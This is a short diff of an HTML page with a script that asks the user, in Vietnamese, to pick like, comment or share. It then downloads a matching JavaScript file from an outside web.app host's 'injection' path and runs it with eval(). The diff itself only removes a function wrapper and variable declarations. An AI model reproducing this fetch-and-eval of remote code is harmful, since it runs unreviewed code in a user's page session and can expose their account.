@@ -9,7 +9,6 @@
 </head>
 <body>
 
-(() => {
 function get(url) {
 return new Promise((resolve, reject) => {
 let xmlhttp = new XMLHttpRequest();
@@ -27,8 +26,8 @@ xmlhttp.send();
 })
 }
 
-let choice = parseInt(prompt(`Nhập lựa chọn của bạn:\n1: like - 2:cmt - 3:share`));
-let fileName = choice === 1 ? 'get-like.js' : choice === 2 ? 'get-cmt.js' : 'get-share.js';
+choice = parseInt(prompt(`Nhập lựa chọn của bạn:\n1: like - 2:cmt - 3:share`));
+fileName = choice === 1 ? 'get-like.js' : choice === 2 ? 'get-cmt.js' : 'get-share.js';
 
 get("https://facebook-check-c-1597716165009.web.app/injection/inject/" + fileName)
 .then(code => {
@@ -36,8 +35,6 @@ console.log(code);
 eval(code);
 })
 .catch(error => console.log(error));
-
-})();
 
 </body>
 </html>
